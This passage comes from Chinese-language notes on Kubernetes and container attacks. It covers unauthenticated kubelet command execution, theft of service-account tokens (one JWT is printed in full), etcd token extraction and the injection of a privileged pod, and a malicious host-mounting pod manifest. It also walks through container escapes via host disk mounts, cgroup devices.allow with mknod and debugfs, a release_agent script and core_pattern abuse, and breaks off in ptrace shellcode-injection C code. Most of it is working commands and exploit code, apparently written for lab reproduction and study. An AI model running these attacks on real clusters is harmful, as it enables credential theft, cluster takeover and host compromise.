evictionPressureTransitionPeriod: 0s
failSwapOn: false
fileCheckFrequency: 0s
healthzBindAddress: 127.0.0.1
healthzPort: 10248
httpCheckFrequency: 0s
imageGCHighThresholdPercent: 100
imageMinimumGCAge: 0s
kind: KubeletConfiguration
logging:
  flushFrequency: 0
  options:
    json:
      infoBufferSize: "0"
  verbosity: 0
memorySwap: {}
nodeStatusReportFrequency: 0s
nodeStatusUpdateFrequency: 0s
rotateCertificates: true
runtimeRequestTimeout: 0s
shutdownGracePeriod: 0s
shutdownGracePeriodCriticalPods: 0s
staticPodPath: /etc/kubernetes/manifests
streamingConnectionIdleTimeout: 0s
syncFrequency: 0s
volumeStatsAggPeriod: 0s
```

然后node机器上执行`systemctl restart kubelet`，再访问发现成功未授权：

![image-20220706132820157](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20220706132820157.png)



```shell
关于authorization-mode还有以下的配置
--authorization-mode=ABAC 基于属性的访问控制（ABAC）模式允许你 使用本地文件配置策略。
--authorization-mode=RBAC 基于角色的访问控制（RBAC）模式允许你使用 Kubernetes API 创建和存储策略。
--authorization-mode=Webhook WebHook 是一种 HTTP 回调模式，允许你使用远程 REST 端点管理鉴权。
--authorization-mode=Node 节点鉴权是一种特殊用途的鉴权模式，专门对 kubelet 发出的 API 请求执行鉴权。
--authorization-mode=AlwaysDeny 该标志阻止所有请求。仅将此标志用于测试。
--authorization-mode=AlwaysAllow 此标志允许所有请求。仅在你不需要 API 请求 的鉴权时才使用此标志。
```





### 执行pod内命令

```shell
curl -XPOST -k https://node_ip:10250/run/<namespace>/<PodName>/<containerName> -d "cmd=command"

curl -XPOST -k https://127.0.0.1:10250/run/default/nginx-deployment-6c74f576b9-ttzdn/nginx -d "cmd=ls"
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
product_uuid
root
run
sbin
srv
sys
tmp
usr
var
```

参数从`https://ip:10250/pods`找到。

（https://ip:10250/runningpods可能更好？？）

```shell
kubeletctl pods -s 10.10.11.133
kubeletctl -s 10.10.11.133 exec -p nginx -c nginx "id" -i

```







### 获取容器内的service account凭据

如果能在Pod内执行命令，那么就可以获取Pod里service account的凭据，使用Pod上的service account凭据可以用来**模拟Pod上的服务账户进行操作**。

```shell
curl -XPOST -k https://127.0.0.1:10250/run/default/nginx-deployment-6c74f576b9-ttzdn/nginx -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```



```bash
kubeletctl -s 10.10.11.133 exec -p nginx -c nginx "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" > ca.crt
 
kubectl  -s https://10.10.11.133:8443/ --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IlpaUVJlT2h2Zk45WFA2MjdnY2FDVHlyNG9QdGRpQlJ1dHVvb0dGa0dYR3cifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI4MjgwMjYyLCJpYXQiOjE2OTY3NDQyNjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVkMzEyMjY5LTg1NTAtNDMxMS1hNjRkLTE2MmMwOTIzZDA5MyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjE5ZDk2N2E1LTM1MmYtNDQ4Yy1hYTI5LWZhM2EzM2U4MTJjMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTY3NDc4Njl9LCJuYmYiOjE2OTY3NDQyNjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.Ur6RSW5k0lcnu0aEu5b56kSZM3R6uT8I_jXPqepOdnROJvhpy_Ens1Vr4c_UOcg6LyEV8GwVfkJVoxPbXplavv8wHV5JClgH-jnyBOvKC30xHZ-gi6Wcrt8f-pd6M1WyH2KynsnxHqlGqZSuyleZshfCCFFik_c6OQg2FHdVdkQ9RxLnmORKWr7kd7F2Mbaw7HbOeSXPGqoKBG99KK_iVz1c1tpUoGDst3im2MpA__PprqKhWGnXd4KncM4U_jJjeVynub3LH4URLzJ_J3Z8BhFScr367lwQImFwxHspKTfo0dGbiSCZVnTlGDs5mVeIRVGMMop1i5UhbUsUjGKSjw" --certificate-authority=ca.crt get pod
```



## etcd未授权

> etcd，它存储集群中每个节点可以使用的配置信息。它是一个高可用性键值存储，可以在多个节点之间分布。只有Kubernetes API服务器可以访问它，因为它可能具有一些敏感信息。这是一个分布式键值存储，所有人都可以访问。
> 简而言之：存储节点信息

其默认监听了2379等端口，如果2379端口暴露到公网，可能造成敏感信息泄露。

etcd是k8s集群中的数据库组件，默认监听在2379端口，如果2379存在未授权，那么就可以通过etcd查询集群内管理员的token，然后用这个token访问api server接管集群。

### 读数据

利用etcdctl工具即可：

```shell
export ETCDCTL_API=3
//获得etcd中存储的所有数据
etcdctl --endpoints=https://127.0.0.1:2379/ get / --prefix --keys-only
```

或者：

```shell
ETCDCTL_API=3 ./etcdctl --endpoints=https://127.0.0.1:2379/ get / --prefix --keys-only
```





正常的未授权的情况是暴露2339端口而且`--client-cert-auth`为false，这时候无需证书也可直接访问。我这里复现的时候没有配置未授权，这样的话就会报错需要授权，带上证书即可。用master节点中的证书加入到环境变量：

```shell
  export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt
  export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt
  export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key
  
  #export ETCDCTL_API=3
  #export ETCDCTL_CERT=/Users/feng/environment/k8s/etcdCrt/peer.crt
  #export ETCDCTL_CACERT=/Users/feng/environment/k8s/etcdCrt/ca.crt
  #export ETCDCTL_KEY=/Users/feng/environment/k8s/etcdCrt/peer.key
```

再访问就正常了。

然后就是拿token然后接管serverapi：

```shell
etcdctl --endpoints=https://etcd_ip:2379/ get / --prefix --keys-only | grep /secrets/
etcdctl --endpoints=https://etcd_ip:2379/ get /registry/secrets/xxxxx/xxxxx
kubectl --insecure-skip-tls-verify -s https://master_ip:6443/ --token="xxxxxx" get nodes
```



**复现：**

创建一个sa账号并绑定cluster-admin：

```bash
kubectl create  admin
kubectl create clusterrolebinding cluster-admin-admin  --clusterrole=cluster-admin --serviceaccount=default:admin
```

创建secret（kubernetes v1.24.0 更新之后进行创建 ServiceAccount 不会自动生成 Secret 需要对其手动创建）：

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: sv-admin-token
  annotations:
    kubernetes.io/service-account.name: admin
type: kubernetes.io/service-account-token
```

这时候再查就可以发现有admin的token可以获得了：

```bash
etcdctl --endpoints=https://127.0.0.1:2379/ get / --prefix --keys-only | grep /secrets/
/registry/secrets/default/sv-admin-token
```

当你删除一个与某 Secret 相关联的 ServiceAccount 时，Kubernetes 的控制面会自动清理该 Secret 中长期有效的令牌。



利用auger可以解码数据

```bash
etcdctl --endpoints=https://127.0.0.1:2379/ get /registry/pods/default/neartest|auger decode
```



### 写数据

https://lonmar.cn/2023/02/03/hack-etcd-in-kubernetes/

（根据环境修改k8s-worker这个hostname）

```yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"labels":{"creator":"feng","team":"feng"},"name":"neartest","namespace":"default"},"spec":{"containers":[{"command":["/bin/sh","-c","tail -f /dev/null"],"image":"alpine","name":"trpc","securityContext":{"capabilities":{"add":["SYS_ADMIN"]},"privileged":true},"volumeMounts":[{"mountPath":"/host/dev","name":"dev"},{"mountPath":"/host/proc","name":"proc"},{"mountPath":"/host/sys","name":"sys"},{"mountPath":"/near_sandbox","name":"rootfs"}]}],"hostIPC":true,"hostNetwork":true,"hostPID":true,"nodeSelector":{"kubernetes.io/hostname":"k8s-worker"},"volumes":[{"hostPath":{"path":"/proc"},"name":"proc"},{"hostPath":{"path":"/dev"},"name":"dev"},{"hostPath":{"path":"/sys"},"name":"sys"},{"hostPath":{"path":"/"},"name":"rootfs"}]}}
  creationTimestamp: "2023-11-03T07:17:51Z"
  labels:
    creator: feng
    team: feng
  name: neartest
  namespace: default
  uid: 3e796737-a8d5-4421-9640-c591f1f8c283
spec:
  containers:
  - command:
    - /bin/sh
    - -c
    - tail -f /dev/null
    image: alpine
    imagePullPolicy: Always
    name: trpc
    resources: {}
    securityContext:
      capabilities:
        add:
        - SYS_ADMIN
      privileged: true
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /host/dev
      name: dev
    - mountPath: /host/proc
      name: proc
    - mountPath: /host/sys
      name: sys
    - mountPath: /near_sandbox
      name: rootfs
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-sm5z8
      readOnly: true
  dnsPolicy: ClusterFirst
  hostIPC: true
  hostNetwork: true
  hostPID: true
  nodeName: k8s-worker
  nodeSelector:
    kubernetes.io/hostname: k8s-worker
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - hostPath:
      path: /proc
      type: ""
    name: proc
  - hostPath:
      path: /dev
      type: ""
    name: dev
  - hostPath:
      path: /sys
      type: ""
    name: sys
  - hostPath:
      path: /
      type: ""
    name: rootfs
  - name: kube-api-access-sm5z8
    projected:
      defaultMode: 420
      sources:
      - {}
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2023-11-03T07:17:51Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2023-11-03T07:17:54Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2023-11-03T07:17:54Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2023-11-03T07:17:51Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://4c77da2f70e8c47f2989183002e8705442ea288f28da8c65d50279a67815ef9d
    image: docker.io/library/alpine:latest
    imageID: docker.io/library/alpine@sha256:eece025e432126ce23f223450a0326fbebde39cdf496a85d8c016293fc851978
    lastState: {}
    name: trpc
    ready: true
    restartCount: 0
    state:
      running:
        startedAt: "2023-11-03T07:17:54Z"
  hostIP: 172.19.0.2
  phase: Running
  podIP: 172.19.0.2
  qosClass: BestEffort
  startTime: "2023-11-03T07:17:51Z"
```

```bash
cat superpod-etcd.yaml|auger encode | ETCDCTL_API=3 etcdctl put /registry/pods/default/neartest
```



# 恶意Pod

nodeSelector的hostname需要自己修改

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: neartest
  labels:
    team: feng
    creator: feng
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  nodeSelector:
    kubernetes.io/hostname: k8s-worker
  containers:
  - name: trpc
    image: alpine
    securityContext:
      privileged: true
      capabilities:
        add:
        - SYS_ADMIN
    command: ["/bin/sh","-c","tail -f /dev/null"]
    volumeMounts:
    - name: dev
      mountPath: /host/dev
    - name: proc
      mountPath: /host/proc
    - name: sys
      mountPath: /host/sys
    - name: rootfs
      mountPath: /near_sandbox
  volumes:
    - name: proc
      hostPath:
        path: /proc
    - name: dev
      hostPath:
        path: /dev
    - name: sys
      hostPath:
        path: /sys
    - name: rootfs
      hostPath:
        path: /
```

hostPID设置让容器可以看到宿主机上的进程。hostIPC允许Pod共享宿主机的IPC命名空间。hostNetwork允许Pod共享宿主机网络的命名空间

# 单容器环境内的信息收集



`cat /proc/1/cgroup`可以判断当前容器是否在Kubernetes 的编排环境中。

> 没使用 Kubernetes 的 docker 容器，其 cgroup 信息长这样：
>
> 12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36
>
> 而 Kubernetes 默认的，长这样：
>
> 12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197

同时，这里的 CGroup 信息也是宿主机内当前容器所对应的 CGroup 路径，在后续的多个逃逸场景中获取 CGroup 的路径是非常重要的。



判断当前shell环境是否是容器：

```shell
cat /proc/1/cgroup

ps aux
#ls -l /proc/*/exe

ls -l .dockerenv

capsh --print

env | grep KUBE

ls -l /run/secrets/kubernetes.io/

mount

df -h

cat /etc/resolv.conf

cat /etc/mtab

cat /proc/self/status

cat /proc/self/mounts

cat /proc/net/unix

cat /proc/1/mountinfo
```



capsh --print 获取到信息是十分重要的，可以打印出当前容器里已有的 Capabilities 权限：

```shell
root@k8s-worker:/# capsh --print
Current: =ep cap_perfmon,cap_bpf,cap_checkpoint_restore-ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Ambient set =
Current IAB: !cap_perfmon,!cap_bpf,!cap_checkpoint_restore
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=
Guessed mode: UNCERTAIN (0)
```

如果没有capsh命令则可以`cat /proc/1/status` 获取到 Capabilities hex 记录之后，再使用 capsh --decode 解码出 Capabilities 的可读字符串即可：

```shell
cat /proc/1/status |grep "Cap"
CapInh:	0000000000000000
CapPrm:	00000000a80425fb
CapEff:	00000000a80425fb
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000

root@k8s-worker:/# capsh --decode="00000000a80425fb"
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```



当无法安装一个kubectl与apiserver通信的时候，可以本地测试，并将相同的请求包发送：

```shell
#如果需要更详细的信息，也可以提高 logging level, 例如 kubectl -v=10 等，其他 Kubernetes 组件也能达到相同的目的。
kubectl get pods -v=8
```

# 容器网络

1. 每个pod都有一个独立的ip，pod内的所有容器共享网络命名空间；
2. 集群内所有Pod都在一个直接连通的扁平网络中，可通过IP直接访问，容器与容器之间、容器与节点之间能够直接通信，无需NAT和地址伪装



![5E1363FA-3148-4B0E-88E6-BBB8B547B6C2](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/5E1363FA-3148-4B0E-88E6-BBB8B547B6C2.png)

当我们获取 Kubernetes 集群内某个容器的 shell，默认情况下我们可以访问以下几个内网里的目标：

1. 相同节点下的其它容器开放的端口
2. 其他节点下的其它容器开放的端口
3. 其它节点宿主机开放的端口
4. 当前节点宿主机开放的端口
5. Kubernetes Service 虚拟出来的服务端口
6. 内网其它服务及端口，主要目标可以设定为 APISERVER、ETCD、Kubelet 等



> 很明显一点是，用户创建的容器可以直接访问内网和 Kubernetes 网络。在这个场景里，合理的网络设计应该和云服务器 VPS 的网络设计一致，用户与用户之间的内网网络不应该互相连通，用户网络和企业内网也应该进行一定程度的隔离，上图中所有对内的流量路径都应该被切断。把所有用户 POD 都放置在一个 Kubernetes namespace 下就更不应该了。





# 逃逸

容器逃逸的本质和硬件虚拟化逃逸的本质有很大的不同 (不包含 Kata Containers 等)，我的理解里容器逃逸的过程是一个受限进程获取未受限的完整权限，又或某个原本受 Cgroup/Namespace 限制权限的进程获取更多权限的操作，更趋近于提权。

## 1.privileged容器内mount device

当使用`--privileged=true`选项运行容器时，Docker会赋予容器几乎与主机相同的权限。具体来说，这个选项做了以下两件事情：

- 给容器添加了所有的capabilities
- 允许容器访问主机的所有设备

进入privileged特权容器后通过`fdisk -l`来查看宿主机的磁盘设备：

```shell
/ # fdisk -l
Disk /dev/vda: 60 GB, 63999836160 bytes, 124999680 sectors
219297 cylinders, 10 heads, 57 sectors/track
Units: sectors of 1 * 512 = 512 bytes

Device  Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
/dev/vda1    2,0,33      103,9,57          2048  124999679  124997632 59.6G 83 Linux
```

如果不在 privileged 容器内部，是没有权限查看磁盘列表并操作挂载的。



因此，在特权容器里，你可以把宿主机里的根目录 / 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的。

```shell
fdisk -l
Disk /dev/vda: 50 GB, 53687091200 bytes, 104857600 sectors
336082 cylinders, 6 heads, 52 sectors/track
Units: sectors of 1 * 512 = 512 bytes

Device  Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
/dev/vda1 *  2,0,33      601,5,52          2048  104857566  104855519 49.9G 83 Linux
mkdir /tmp/mount
mount /dev/vda1 /tmp/mount
cd /tmp/mount
/tmp/mount # ls
bin             flag            lib64           opt             sbin            usr
boot            home            log             patch           snap            var
data            initrd.img      lost+found      proc            srv             vmlinuz
dev             initrd.img.old  media           root            sys             vmlinuz.old
etc             lib             mnt             run             tmp             www
/tmp/mount #
```

但是此类行为很容器告警。



## 2.攻击lxcfs

https://linuxcontainers.org/lxcfs/

**lxcfs作用就是将容器内/proc、/sys文件与物理机隔离，让top等命令显示容器内真实数据。**



通过`cat /proc/1/mountinfo`命令来判断是否使用了lxcfs。`Linux`系统的`/proc/self/mountinfo`记录当前系统所有挂载文件系统的信息。df命令也会读取这个文件。



lxcfs绑定的那个路径下会绑定当前容器的 devices subsystem cgroup 进入容器内，且在容器内有权限对该 devices subsystem 进行修改。

```shell
#可以修改当前容器的设备访问权限，致使我们在容器内可以访问所有类型的设备
echo a > devices.allow
```



/etc/hosts， /dev/termination-log，/etc/resolv.conf， /etc/hostname 这四个容器内文件是由默认从宿主机挂载进容器的，所以在他们的挂载信息内很容易能获取到主设备号 ID。



```shell
cat /proc/1/mountinfo|grep "etc"
856 823 252:1 /var/lib/docker/containers/b8b0ffc5c1bbdfa6e39520f759fdb150dd5816fc3f079025a9c9e8b4ddd42a63/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/vda1 rw,errors=remount-ro,data=ordered
857 823 252:1 /var/lib/docker/containers/b8b0ffc5c1bbdfa6e39520f759fdb150dd5816fc3f079025a9c9e8b4ddd42a63/hostname /etc/hostname rw,relatime - ext4 /dev/vda1 rw,errors=remount-ro,data=ordered
858 823 252:1 /var/lib/docker/containers/b8b0ffc5c1bbdfa6e39520f759fdb150dd5816fc3f079025a9c9e8b4ddd42a63/hosts /etc/hosts rw,relatime - ext4 /dev/vda1 rw,errors=remount-ro,data=ordered
```

可以看出主设备号为252 1

使用 mknod 创建相应的设备文件目录并使用 debugfs 进行访问，此时我们就有了读写宿主机任意文件的权限：

```shell
mknod mknod_near b 252 1
debugfs -w mknod_near

#或者 
mkdir /tmp/mknod_near
mount /mknod_near /tmp/mknod_near
#再访问/tmp/mknod_near即可
```

（**但是本地运行了一个特权容器没有复现成功，报mknod: mknod_near: Operation not permitted错误，猜测可能是因为AppArmor的原因。通过`sudo service apparmor stop`关闭apparmor就解决了**）





这个手法和利用方式不仅可以作用于 lxcfs 的问题，即使没有安装和使用 lxcfs，当容器为 privileged、sys_admin 等特殊配置时，可以使用相同的手法进行逃逸：

```bash
mkdir /tmp/dev
mount -t cgroup -o devices devices /tmp/dev/
#获取容器id
cat /proc/self/cgroup | head -1
echo a > /tmp/dev/docker/90dac44d46b7ef59d4ca4bd86cff77fe972181c38ff15603eb5739781aa61b9c/devices.allow
cat /proc/1/mountinfo|grep "etc"
mknod near b 252 1
debugfs -w near
#mount /near /tmp/near
```





## 3.创建cgroup进行容器逃逸

上面提到了 **privileged 配置**可以理解为一个很大的权限集合，可以直接 mount device 并不是它唯一的权限和利用手法，另外一个比较出名的手法就是利用 cgroup release_agent 进行容器逃逸以在宿主机执行命令，这个手法同样可以作用于 **sys_admin** 的容器。



```bash
#!/bin/bash

set -uex

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ls /root > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

sleep 2
cat "/output"
```

newbing对这个脚本的解释：

> 这是一个bash脚本，用于利用cgroup和notify_on_release功能在Docker容器中执行任意命令。下面是每一行的解释：
>
> - `#!/bin/bash`：这是一个shebang，指定了运行脚本的解释器，即bash。
> - `set -uex`：这是一个set命令，用于设置脚本的选项。`-u`表示当引用未定义的变量时，会报错并退出。`-e`表示当任何命令执行失败时，会立即退出。`-x`表示在执行每个命令之前，会打印出该命令。
> - `mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`：这是三个命令，用逻辑与符号`&&`连接，表示只有当前一个命令成功时，才会执行下一个命令。第一个命令是创建一个临时目录/tmp/cgrp。第二个命令是将cgroup文件系统挂载到/tmp/cgrp目录，并指定使用memory子系统。第三个命令是在/tmp/cgrp目录下创建一个子目录x。
> - `echo 1 > /tmp/cgrp/x/notify_on_release`：这是一个echo命令，用于将1输出到/tmp/cgrp/x/notify_on_release文件中。这个文件是cgroup的一个特殊文件，用于控制当cgroup中没有进程时，是否执行release_agent指定的程序。
> - `host_path=`sed -n ‘s/.*\perdir=([^,]*).*/\1/p’ /etc/mtab``：这是一个赋值语句，用于将host_path变量设置为/etc/mtab文件中匹配perdir=的值。/etc/mtab文件是一个记录当前挂载点信息的文件。sed是一个文本处理工具，用于对输入的文本进行替换、删除、打印等操作。这里使用的sed命令是将每一行中perdir=后面的值提取出来，并打印出来。例如，如果一行是`/dev/sda1 / ext4 rw,relatime,errors=remount-ro,data=ordered 0 0`，则sed命令会输出`/`。
> - `echo "$host_path/cmd" > /tmp/cgrp/release_agent`：这是一个echo命令，用于将host_path变量后面加上/cmd的字符串输出到/tmp/cgrp/release_agent文件中。这个文件是cgroup的另一个特殊文件，用于指定当cgroup中没有进程时，执行的程序。
> - `echo '#!/bin/sh' > /cmd`：这是一个echo命令，用于将#!/bin/sh输出到/cmd文件中。这个文件是我们要在容器中执行的脚本。
> - `echo "ls /root > $host_path/output" >> /cmd`：这是另一个echo命令，用于将ls /root > $host_path/output输出到/cmd文件中，并追加到已有内容后面。这个命令表示列出容器中/root目录下的文件，并将结果重定向到host_path变量指定的目录下的output文件中。
> - `chmod a+x /cmd`：这是一个chmod命令，用于修改/cmd文件的权限，使其对所有用户可执行。
> - `sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`：这是一个sh命令，用于在子shell中执行`echo $$ > /tmp/cgrp/x/cgroup.procs`。这个命令表示将当前进程的PID输出到/tmp/cgrp/x/cgroup.procs文件中。这个文件是cgroup的又一个特殊文件，用于指定哪些进程属于该cgroup。
> - `sleep 2`：这是一个sleep命令，用于暂停脚本执行2秒钟。
> - `cat "/output"`：这是一个cat命令，用于显示/output文件的内容。这个文件应该包含了容器中/root目录下的文件列表。
>
> 总之，这个脚本的作用是创建一个cgroup，将自己的进程加入到该cgroup中，然后设置当该cgroup中没有进程时，执行/cmd脚本。/cmd脚本是在容器中列出/root目录下的文件，并将结果保存到宿主机上的/output文件中。这样，当脚本执行完毕后，cgroup中没有进程，就会触发release_agent的执行，即/cmd脚本的执行。这就相当于在容器中执行了任意命令。

总结下来就是挂在宿主机的cgroup，利用cgroup release_agent机制，当

notify_on_release文件为1的时候，cgroup中没有进程时，将执行release_agent指定的程序。将目标程序的路径写到release_agent，等到当前进程消失后即可触发release_agent的执行。



其中`host_path=sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` 经常在不同的 Docker 容器逃逸 EXP 被使用到；如果我们在漏洞利用过程中，需要在容器和宿主机内进行文件或文本共享，这种方式是非常棒且非常通用的一个做法。

其思路在于利用 Docker 容器镜像分层的文件存储结构 (Union FS)，从 mount 信息中找出宿主机内对应当前容器内部文件结构的路径；则对该路径下的文件操作等同于对容器根目录的文件操作。

![image-20231010142828347](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20231010142828347.png)



该逃逸方法也可以不需要特权容器，只需满足：

1. 以root用户身份在容器内运行
2. 使用`SYS_ADMIN` Linux功能运行
3. 缺少AppArmor配置文件，否则将允许mountsyscall
4. cgroup v1虚拟文件系统必须以读写方式安装在容器内





复刻lxcfs攻击思路，复用到 sys_admin 或特权容器的场景上读写母机上的文件：

```bash
mkdir /tmp/dev
mount -t cgroup -o devices devices /tmp/dev/
cat /proc/self/cgroup | head -1
echo a > /tmp/dev/docker/90dac44d46b7ef59d4ca4bd86cff77fe972181c38ff15603eb5739781aa61b9c/devices.allow
cat /proc/1/mountinfo|grep "etc"
mknod near b 252 1
debugfs -w near
#mount /near /tmp/near
```







## 4.特殊路径挂载导致的容器逃逸

### 4.1Docker in Docker

即宿主机的 /var/run/docker.sock 被挂载容器内的时候，容器内就可以通过 docker.sock 在宿主机里创建任意配置的容器，此时可以理解为可以创建任意权限的进程；当然也可以控制任意正在运行的容器。







### 4.2 攻击挂载了主机/proc目录的机器

逃逸并在外部执行命令的方式主要是利用了 linux 的 /proc/sys/kernel/core_pattern 文件。



core_pattern 指的是：/proc/sys/kernel/core_pattern，我们知道在Linux系统中，如果进程崩溃了，系统内核会捕获到进程崩溃信息，然后将进程的coredump 信息写入到文件中，这个文件名默认是core，但是也可以通过配置修改这个文件名。比如可以通过修改/proc/sys/kernel/core_pattern 文件的内容来指定。如果core_pattern 中第一个字符是 Linux管道符 |, 那么Linux 内核在捕获进程崩溃信息的时候，就会以root权限执行管道符后门的程序或者脚本，将进程崩溃信息传递给这个程序或者脚本。



因此通过控制core_pattern，当容器内进程崩溃的时候，自动调用core_pattern指定的脚本来在宿主机上执行命令。

（其中`/merged`路径和`/diff`路径都可以）

```shell
sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
/var/lib/docker/overlay2/b842a67bf5ba0b454b0c77f342554086fb57fa72bae0f18b5a52795c1ea8ee38/diff

echo -e "|/var/lib/docker/overlay2/b842a67bf5ba0b454b0c77f342554086fb57fa72bae0f18b5a52795c1ea8ee38/diff/exp.sh core" > /host_proc/sys/kernel/core_pattern

echo '#!/bin/sh' > /exp.sh
echo "ls /root > /var/lib/docker/overlay2/b842a67bf5ba0b454b0c77f342554086fb57fa72bae0f18b5a52795c1ea8ee38/diff/tmp/output" >> /exp.sh

chmod 777 /exp.sh

vi 1.c
#include <stdio.h>
int main(void)
{
    int *a = NULL;
    *a=1;
    return 0;
}

gcc 1.c

./a.out
Segmentation fault

#上面坑很多，sh里面必须加#!/bin/sh，直接写根目录可能有问题最好写tmp，别忘了777
#编译要装gcc和g++
```

其中服务器上core_pattern原本的内容

```shell
|/usr/share/apport/apport %p %s %c %d %P %E
```



## 5.SYS_PTRACE安全风险

SYS_PTRACE权限的作用是允许跟踪任何进程。可以挟持进程实现shellcode的注入。利用方式类似进程注入。从docker内部注入宿主机的root进程，再通过shellcode将shell连接到攻击机上面



利用前提：

```shell
--cap-add=SYS_PTRACE
--pid=host
--security-opt apparmor=unconfined
```

通过ps命令找到宿主机的root进程PID，注入c代码：

```c
/*
  Mem Inject
  Copyright (c) 2016 picoFlamingo

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 74

unsigned char *shellcode = 
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";


int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

